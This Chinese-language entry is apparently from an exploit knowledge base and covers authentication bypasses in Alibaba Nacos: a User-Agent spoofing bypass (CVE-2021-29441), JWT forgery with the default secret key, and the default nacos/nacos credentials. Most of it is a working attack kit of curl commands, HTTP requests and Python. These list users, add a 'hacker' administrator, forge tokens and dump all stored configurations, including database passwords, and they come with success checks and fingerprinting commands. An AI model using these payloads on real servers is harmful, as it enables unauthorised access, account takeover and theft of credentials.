---
id: NACOS-AUTH-BYPASS
title: Nacos 认证绕过漏洞
product: nacos
vendor: Alibaba
version_affected: "< 2.2.1, < 1.4.6"
severity: CRITICAL
tags: [auth_bypass, 国产, 中间件, 微服务, 无需认证]
fingerprint: ["Nacos", "nacos", "/nacos/", "/v1/auth/", "/v1/cs/configs", "console-ui"]
---

## 漏洞描述

Alibaba Nacos 注册配置中心存在多个认证绕过漏洞，可未授权访问配置信息、创建用户、获取敏感数据。

## 影响版本

- Nacos < 2.2.1（默认JWT密钥）
- Nacos < 1.4.6（User-Agent绕过）
- Nacos 全版本（默认凭据 nacos/nacos）

## 前置条件

- 目标开放 8848 端口，运行 Nacos 服务
- 无需认证凭据

## 利用步骤

### CVE-2021-29441: User-Agent 绕过认证

```http
GET /nacos/v1/auth/users?pageNo=1&pageSize=9 HTTP/1.1
Host: target:8848
User-Agent: Nacos-Server
```

### 添加管理员账号

```http
POST /nacos/v1/auth/users HTTP/1.1
Host: target:8848
User-Agent: Nacos-Server
Content-Type: application/x-www-form-urlencoded

username=hacker&password=hacker123
```

### QVD-2023-6271: Token 伪造 (默认密钥)

Nacos < 2.2.1 使用默认 JWT 密钥 `SecretKey012345678901234567890123456789012345678901234567890123456789`

```python
import jwt
token = jwt.encode({"sub": "nacos", "exp": 9999999999}, "SecretKey012345678901234567890123456789012345678901234567890123456789", algorithm="HS256")
```

```http
GET /nacos/v1/cs/configs?dataId=&group=&tenant=&pageNo=1&pageSize=100 HTTP/1.1
Host: target:8848
Authorization: Bearer <forged_token>
```

### 读取所有配置（泄露数据库密码等）

```bash
curl "http://target:8848/nacos/v1/cs/configs?dataId=&group=&tenant=&pageNo=1&pageSize=100&search=accurate" \
  -H "User-Agent: Nacos-Server"
```

### 默认凭据

- `nacos` / `nacos`

## Payload

```bash
# CVE-2021-29441: User-Agent绕过列出用户
curl -s "http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9" \
  -H "User-Agent: Nacos-Server"

# 添加管理员账号
curl -X POST "http://target:8848/nacos/v1/auth/users" \
  -H "User-Agent: Nacos-Server" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=hacker&password=hacker123"

# QVD-2023-6271: 使用默认密钥伪造Token读取配置
TOKEN=$(python3 -c "import jwt; print(jwt.encode({'sub':'nacos','exp':9999999999}, 'SecretKey012345678901234567890123456789012345678901234567890123456789', algorithm='HS256'))")
curl -s "http://target:8848/nacos/v1/cs/configs?dataId=&group=&tenant=&pageNo=1&pageSize=100&search=accurate" \
  -H "Authorization: Bearer $TOKEN"
```

## 验证方法

```bash
# 验证User-Agent绕过：响应体是用户分页 JSON，含 totalCount、pageNumber、pageItems
curl -s "http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9" \
  -H "User-Agent: Nacos-Server"
# 判据：pageItems 数组里出现 username / roles 字段（如 username":"nacos）
# 反例：403 且响应体为 {"status":403,"message":"user not found!"}，或返回 Nacos 登录页 HTML

# 验证默认凭据：登录响应 JSON 的 accessToken 是非空长串
curl -s "http://target:8848/nacos/v1/auth/login" \
  -X POST -d "username=nacos&password=nacos"
# 判据：响应含 "accessToken":"eyJ..." 且 tokenTtl 有具体值
# 反例：返回登录页 HTML，或 {"status":403,"message":"unknown user!"}

# 验证默认JWT密钥：用默认密钥伪造的 token 能读到配置
curl -s "http://target:8848/nacos/v1/cs/configs?dataId=&group=&tenant=&pageNo=1&pageSize=1&search=accurate" \
  -H "Authorization: Bearer $TOKEN"
# 判据：响应体是配置分页 JSON，含 totalCount / pageItems，pageItems 元素带 dataId、group、content
# 反例：403 且响应体为 {"status":403,"message":"user not found!"} → 密钥已更换
```

## 指纹确认

```bash
curl -s http://target:8848/nacos/
curl -s http://target:8848/nacos/v1/console/server/state
```
